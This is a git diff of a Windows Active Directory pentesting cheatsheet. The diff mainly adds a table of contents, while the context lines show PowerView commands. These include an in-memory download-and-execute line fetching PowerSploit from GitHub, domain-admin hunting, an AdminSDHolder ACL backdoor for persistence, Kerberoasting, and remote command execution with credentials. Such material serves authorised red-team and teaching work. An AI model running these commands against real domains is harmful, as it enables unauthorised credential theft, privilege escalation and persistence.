@@ -6,10 +6,27 @@ categories: Pentesting Windows
 grand_parent: Cheatsheets
 has_children: true
 ---
-
 # {{ page.title}}
 
-## PRE-REQUISITE: Installing PowerView
+<!-- vscode-markdown-toc -->
+* 1. [PRE-REQUISITE: Installing PowerView](#PRE-REQUISITE:InstallingPowerView)
+* 2. [PRE-REQUISITE: AD Web Services on the DC](#PRE-REQUISITE:ADWebServicesontheDC)
+* 3. [ENUM : DOMAIN ADMIN](#ENUM:DOMAINADMIN)
+* 4. [ENUM : PRIVILEGED USERS](#ENUM:PRIVILEGEDUSERS)
+* 5. [ENUM : DOMAIN](#ENUM:DOMAIN)
+* 6. [ENUM: DOMAIN PERSISTENCY](#ENUM:DOMAINPERSISTENCY)
+* 7. [ENUM: FOREST PRIVESC](#ENUM:FORESTPRIVESC)
+* 8. [ENUM: SERVICES LOOTS](#ENUM:SERVICESLOOTS)
+* 9. [ENUM: Kerberoasting](#ENUM:Kerberoasting)
+* 10. [MISC](#MISC)
+
+<!-- vscode-markdown-toc-config
+	numbering=true
+	autoSave=true
+	/vscode-markdown-toc-config -->
+<!-- /vscode-markdown-toc -->
+
+##  1. <a name='PRE-REQUISITE:InstallingPowerView'></a>PRE-REQUISITE: Installing PowerView
 
 - [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
 
@@ -26,7 +43,7 @@ iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 # PowerView Module
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');New-InMemoryModule
 ```
-## PRE-REQUISITE: AD Web Services on the DC
+##  2. <a name='PRE-REQUISITE:ADWebServicesontheDC'></a>PRE-REQUISITE: AD Web Services on the DC
 
 On the error below when loading the AD module, ADWS must be reachable and running:
 - TCP port 9389 reachable from your endpoint (and listening on the DC) : ```Test-NetConnection DC01 -port 9389```
@@ -40,7 +57,7 @@ AVERTISSEMENT : Error initializing default drive: 'Unable to find a default ser
 For more info, read the article from [theitbros.om](
 https://theitbros.com/unable-to-find-a-default-server-with-active-directory-web-services-running/).
 
-## ENUM : DOMAIN ADMIN
+##  3. <a name='ENUM:DOMAINADMIN'></a>ENUM: DOMAIN ADMIN
 ```powershell
 # PowerView: find where DA has logged on / and current user has access
 Invoke-UserHunter
@@ -53,7 +70,7 @@ Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select membername, me
 Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain <Forest> | select membername, membersid
 ```
 
-## ENUM : PRIVILEGED USERS
+##  4. <a name='ENUM:PRIVILEGEDUSERS'></a>ENUM: PRIVILEGED USERS
 
 - [Well-known Microsoft SID List](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)
 
@@ -104,7 +121,7 @@ $mycreds = New-Object System.Management.Automation.PSCredential("<sogreat>", (ne
 Invoke-Command -Credential $mycreds -ComputerName <Computer> -ScriptBlock {whoami; hostname}
 ```
 
-## ENUM : DOMAIN
+##  5. <a name='ENUM:DOMAIN'></a>ENUM: DOMAIN
 
 ```powershell
 Get-NetDomainController
@@ -170,7 +187,7 @@ Get-DomainObjectAcl "dc=dev,dc=<Domain>,dc=local" -ResolveGUIDs | ? {
 }
 ```
 
-## ENUM: DOMAIN PERSISTENCY
+##  6. <a name='ENUM:DOMAINPERSISTENCY'></a>ENUM: DOMAIN PERSISTENCY
 
 ```powershell
 # enumerate who has rights to the 'matt' user in '<Domain>.local', resolving rights GUIDs to names
@@ -186,7 +203,7 @@ Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=<Domain>,DC=local
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<Domain>,DC=local' -PrincipalIdentity matt -Rights All/
 ```
 
-## ENUM: FOREST PRIVESC
+##  7. <a name='ENUM:FORESTPRIVESC'></a>ENUM: FOREST PRIVESC
 
 ```powershell
 # get the trusts of the current domain/forest
@@ -211,7 +228,7 @@ Find-DomainUserLocation -ComputerUnconstrained -ShowAll
 Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
 ```
 
-## ENUM: SERVICES LOOTS
+##  8. <a name='ENUM:SERVICESLOOTS'></a>ENUM: SERVICES LOOTS
 
 ```powershell
 # find all users with an SPN set (likely service accounts)
@@ -237,7 +254,7 @@ Get-NetComputer -OperatingSystem "Windows 2008*" -Ping
 
 ```
 
-## ENUM: Kerberoasting
+##  9. <a name='ENUM:Kerberoasting'></a>ENUM: Kerberoasting
 
 ```powershell
 # get the last password set of each user in the current domain
@@ -255,7 +272,7 @@ Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=<Domain>,DC=local"
 ```
 
-## MISC
+##  10. <a name='MISC'></a>MISC
 
 ```powershell
 # get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
